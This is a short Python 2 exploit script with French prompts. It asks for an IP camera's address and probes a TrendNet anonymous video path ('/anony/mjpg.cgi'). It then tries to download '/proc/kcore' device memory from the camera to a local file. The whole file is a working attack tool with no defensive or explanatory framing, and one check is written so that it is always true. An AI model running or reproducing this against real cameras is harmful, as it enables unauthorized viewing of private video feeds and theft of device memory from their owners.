import requests
import urllib, urllib2
import os, sys

def dlProgress(count, blockSize, totalSize):
      percent = int(count*blockSize*100/totalSize)
      sys.stdout.write("%2d%%" % percent)
      sys.stdout.write("\b\b\b")
      sys.stdout.flush()

def exploit_one():
	try:
		r = requests.get(url, allow_redirects=True)
		rstat = r.status_code == requests.codes.ok
		if rstat == False:
			print "CAM FOUND\r\ntest exploit trendnet..."
			print exploit
			req = requests.head(exploit, allow_redirects=True)
			if (req.status_code == requests.codes.ok):
				print "exploit OK" 
			else:
				print "exploit NOT"
		else:
			print "web interface found"
	except:
		print "error connexion or 'http:// forget' "


url = raw_input("entrez l'ip de la camera : \n")
payload = "/anony/mjpg.cgi"
payload_two = "//proc/kcore"

exploit = (url+payload)
exploit_two = (url+payload_two)
data = "data.cgi"
data_two = "data_two.bin"

print("test cam...")

exploit_one()

try:
	r = requests.get(url, allow_redirects=True)
	rstat = r.status_code == requests.codes.ok
	if rstat == False or True:
		print "\ntest exploit proc/kcore..."
		try:
			print exploit_two
			print "exploit running..."
			dl = urllib.urlretrieve(exploit_two, filename=data_two, reporthook=dlProgress)
		except:
			print "exploit NOT"
	else:
		print "error requests"
except:
	print "error connexion"
